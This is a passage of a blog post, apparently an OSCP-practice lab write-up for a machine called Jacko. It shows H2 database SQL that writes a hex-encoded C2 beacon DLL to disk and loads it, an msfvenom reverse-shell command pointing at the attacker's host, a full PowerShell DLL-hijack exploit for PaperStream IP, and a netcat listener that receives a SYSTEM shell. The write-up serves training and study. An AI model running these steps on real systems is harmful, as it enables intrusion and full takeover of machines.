+CHAR<span style="color:#f92672">(</span>0x74<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x62<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x65<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x72<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x75<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x69<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x44<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x4f<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x53<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x6d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6f<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x64<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x65<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x2e<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x0d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x0d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x0a<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x24<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0xc1<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x0d<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x06<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xe7<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x85<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x85<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x85<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, 
+CHAR<span style="color:#f92672">(</span>0x91<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x07<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x69<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb5<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x86<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x85<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x69<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x88<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x6c<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>, CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span> 
+</code></pre></div><p>Now we need to remove the whitespace / newlines</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ cat test4.txt|awk <span style="color:#e6db74">&#39;{ gsub(/ /,&#34;&#34;); print }&#39;</span> &gt; test5.txt
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ cat test5.txt| tr -d <span style="color:#e6db74">&#39;\n&#39;</span> &gt; test6.txt
+</code></pre></div><h2 id="fixing-issues-with-payload-above">Fixing issues with payload above<a href="#fixing-issues-with-payload-above" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>So for some reason my attempt above didn&rsquo;t work and i kept getting an SQL write error.</p>
+<p>After some googling I found a POC for this exploit and it had a one liner in it to perform all the steps i did above to get our payload into the write format to be written to disk.</p>
+<blockquote>
+<p>also I ended up using a posh c2 beacon because my reverse shell dll from msfvenom didn&rsquo;t work, it returned a connection to my nc listener but not a shell</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ xxd -p -c <span style="color:#ae81ff">256</span> poshdll.dll | sed -e <span style="color:#e6db74">&#39;s/../),CHAR(0x&amp;/g&#39;</span> -e <span style="color:#e6db74">&#39;s/^),//&#39;</span> -e <span style="color:#e6db74">&#39;s/$/)/&#39;</span> -e <span style="color:#e6db74">&#39;s/CHAR(0x22)/&amp;,&amp;/g&#39;</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> &gt; final.txt
+</code></pre></div><p>Because i used Posh c2 beacon for this payload it ended up being huge so i have trimmed it in the notes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SELECT CSVWRITE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;C:\Windows\Temp\poshBeaco.dll&#39;</span>, CONCAT<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;SELECT NULL &#34;&#39;</span>, CHAR<span style="color:#f92672">(</span>0x4d<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x5a<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x90<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x03<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x04<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xff<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xb8<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x40<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x10<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x01<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x0e<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x1f<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xba<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x0e<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xb4<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x09<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xcd<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x21<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xb8<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x01<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x4c<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0xcd<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x21<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x54<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x68<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x69<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x73<span style="color:#f92672">)</span>,CHAR<span style="color:#f92672">(</span>0x20<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>...SNIP...<span style="color:#f92672">]</span> , <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#39;ISO-8859-1&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>;
+</code></pre></div><p>Once the payload was written to disk we could load it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">CREATE ALIAS IF NOT EXISTS System_load FOR <span style="color:#e6db74">&#34;java.lang.System.load&#34;</span>;
+CALL System_load<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;C:\Windows\Temp\poshBeacon.dll&#39;</span><span style="color:#f92672">)</span>;
+</code></pre></div><p><img src="/images/foothold.png" alt="foothold"></p>
+<h1 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A pipe is a section of shared memory that processes use for communication. The process that creates a pipe is the pipe server. A process that connects to a pipe is a pipe client. One process writes information to the pipe, then the other process reads the information from the pipe.” In other words, <strong>pipes are one of the many ways of achieving Inter-Process Communications</strong> (IPC) on Windows, just like RPC, COM or sockets for example.</p>
+<p><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">JACKO<span style="color:#ae81ff">\t</span>ony @ JACKO <span style="color:#f92672">(</span>PID:2120 - Process:netsh<span style="color:#f92672">)</span>        
+PS 21&gt; ls <span style="color:#e6db74">&#34;c:\program files (x86)&#34;</span> 
+
+
+Task <span style="color:#ae81ff">00767</span> <span style="color:#f92672">(</span>tom2<span style="color:#f92672">)</span> issued against implant <span style="color:#ae81ff">21</span> on host JACKO<span style="color:#ae81ff">\t</span>ony @ JACKO <span style="color:#f92672">(</span>2022-06-25 21:14:46<span style="color:#f92672">)</span>
+ls <span style="color:#e6db74">&#34;c:\program files (x86)&#34;</span>
+
+
+Task <span style="color:#ae81ff">00767</span> <span style="color:#f92672">(</span>tom2<span style="color:#f92672">)</span> returned against implant <span style="color:#ae81ff">21</span> on host JACKO<span style="color:#ae81ff">\t</span>ony @ JACKO <span style="color:#f92672">(</span>2022-06-25 21:14:46<span style="color:#f92672">)</span>
+
+
+
+    Directory: C:<span style="color:#ae81ff">\p</span>rogram files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-----        4/27/2020   8:59 PM                Common Files                                                           
+d-----        4/27/2020   9:01 PM                fiScanner                                                              
+d-----        4/27/2020   8:59 PM                H2                                                                     
+d-----         5/3/2022   6:22 PM                Internet Explorer                                                      
+d-----        3/18/2019   9:52 PM                Microsoft.NET                                                          
+d-----        4/27/2020   9:01 PM                PaperStream IP                                                         
+d-----        3/18/2019  11:20 PM                Windows Defender                                                       
+d-----        3/18/2019   9:52 PM                Windows Mail                                                           
+d-----        4/24/2020   9:50 AM                Windows Media Player                                                   
+d-----        3/18/2019  11:23 PM                Windows Multimedia Platform                                            
+d-----        3/18/2019  10:02 PM                Windows NT                                                             
+d-----        3/18/2019  11:23 PM                Windows Photo Viewer                                                   
+d-----        3/18/2019  11:23 PM                Windows Portable Devices                                               
+d-----        3/18/2019   9:52 PM                WindowsPowerShell
+
+</code></pre></div><p>There is an interesting <strong>32 bit</strong> program running on the machine.</p>
+<p>Taking a look in exploit db for anything of interest we have identified a potential DLL hijack of a privileged process we could use for privilege escalation</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ searchsploit paperstream ip            
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+PaperStream IP <span style="color:#f92672">(</span>TWAIN<span style="color:#f92672">)</span> 1.42.0.5685 - Local Privilege Escalation         | windows/local/49382.ps1
+------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre></div><h3 id="dll-hijack-payload">DLL Hijack payload<a href="#dll-hijack-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$PayloadFile = <span style="color:#e6db74">&#34;C:\Users\tony\desktop\shell3.dll&#34;</span>
+
+<span style="color:#66d9ef">if</span> ((Test-Path $PayloadFile) <span style="color:#f92672">-eq</span> $false) {
+    Write-Host <span style="color:#e6db74">&#34;$PayloadFile not found, did you forget to upload it?&#34;</span>
+    Exit 1
+}
+
+<span style="color:#75715e"># Find Writable Location</span>
+$WritableDirectory = $null
+$Path = (Get-ItemProperty -Path <span style="color:#e6db74">&#34;Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment&#34;</span> -Name <span style="color:#e6db74">&#34;PATH&#34;</span>).path
+$Path -Split <span style="color:#e6db74">&#34;;&#34;</span> | % {
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#66d9ef">[IO.File]</span>::OpenWrite(<span style="color:#e6db74">&#34;$_\x.txt&#34;</span>).close()
+        Remove-Item <span style="color:#e6db74">&#34;$_\x.txt&#34;</span>
+        $WritableDirectory = $_
+    } <span style="color:#66d9ef">catch</span> {}
+}
+
+<span style="color:#66d9ef">if</span> ($WritableDirectory <span style="color:#f92672">-eq</span> $null) {
+    Write-Host <span style="color:#e6db74">&#34;No writable directories in PATH, FJTWSVIC is not exploitable&#34;</span>
+    Exit 1
+}
+
+Write-Host <span style="color:#e6db74">&#34;Writable location found, copying payload to $WritableDirectory&#34;</span>
+Copy-Item <span style="color:#e6db74">&#34;$PayloadFile&#34;</span> <span style="color:#e6db74">&#34;$WritableDirectory\UninOldIS.dll&#34;</span>
+
+Write-Host <span style="color:#e6db74">&#34;Payload copied, triggering...&#34;</span>
+$client = New-Object System.IO.Pipes.NamedPipeClientStream(<span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#e6db74">&#34;FjtwMkic_Fjicube_32&#34;</span>, <span style="color:#66d9ef">[System.IO.Pipes.PipeDirection]</span>::InOut, <span style="color:#66d9ef">[System.IO.Pipes.PipeOptions]</span>::None, <span style="color:#66d9ef">[System.Security.Principal.TokenImpersonationLevel]</span>::Impersonation)
+$reader = $null
+$writer = $null
+<span style="color:#66d9ef">try</span> {
+    $client.Connect()
+    $reader = New-Object System.IO.StreamReader($client)
+    $writer = New-Object System.IO.StreamWriter($client)
+    $writer.AutoFlush = $true
+    $writer.Write(<span style="color:#e6db74">&#34;ChangeUninstallString&#34;</span>)
+    $reader.ReadLine()
+} <span style="color:#66d9ef">finally</span> {
+    $client.Dispose()
+}
+
+
+</code></pre></div><h3 id="generate-dll">Generate DLL<a href="#generate-dll" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We need to generate an x86 (32 bit) payload because although the Windows system is 64 bit, the program we are exploiting is 32 bit which will need to run our 32 bit payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>
+└─$ msfvenom -p windows/shell_reverse_tcp -f dll -o shell3.dll LHOST<span style="color:#f92672">=</span>192.168.49.162 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">445</span>
+</code></pre></div><h3 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This vulnerability is caused by this program <code>Paperstream IP</code> which has a service called <code>FJTWSVIC</code> running with SYSTEM privileges. This processes  accepts unauthenticated messages over the FjtwMkic_Fjicube_32 named pipe. One of these message processing functions attempts to dynamically load a dll called <code>UninOldIS.dll</code>. To cause the service to attempt to load this dll the string <code>ChangeUninstallString</code> can be passed via the named pipe.</p>
+<p><img src="/images/namedPipes.png" alt="pipes"></p>
+<p>We can see the named pipe of the vulnerable process is running, confirming the process is on the machine, we just need to write the dll anywhere in the path and get the service to execute it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\d</span>esktop&gt; .<span style="color:#ae81ff">\4</span>9382.ps1
+.<span style="color:#ae81ff">\4</span>9382.ps1
+Writable location found, copying payload to C:<span style="color:#ae81ff">\J</span>avaTemp<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>Payload copied, triggering...
+
+
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/jacko<span style="color:#f92672">]</span>       
+└─$ sudo nc -nvlp <span style="color:#ae81ff">445</span>                            
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">445</span> ...
+connect to <span style="color:#f92672">[</span>192.168.49.162<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.162.66<span style="color:#f92672">]</span> <span style="color:#ae81ff">50059</span>            
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.18363.836<span style="color:#f92672">]</span>   
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> Microsoft Corporation. All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami                                                   
+whoami                             
+nt authority<span style="color:#ae81ff">\s</span>ystem   
+</code></pre></div><h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html">https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html</a></li>
+<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/intro.html#wp9502">https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/intro.html#wp9502</a></li>
+<li><a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiw1LXjxe74AhUaQEEAHbxRDLQQFnoECBEQAw&amp;url=https%3A%2F%2Fmedium.com%2F%40callkalpa%2Fuser-defined-functions-and-stored-procedures-with-h2-database-a1cbfa510559&amp;usg=AOvVaw2v6yMaAV1SCglNuaTQM40t">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiw1LXjxe74AhUaQEEAHbxRDLQQFnoECBEQAw&amp;url=https%3A%2F%2Fmedium.com%2F%40callkalpa%2Fuser-defined-functions-and-stored-procedures-with-h2-database-a1cbfa510559&amp;usg=AOvVaw2v6yMaAV1SCglNuaTQM40t</a></li>
+<li><a href="http://www.h2database.com/html/features.html#user_defined_functions">http://www.h2database.com/html/features.html#user_defined_functions</a></li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
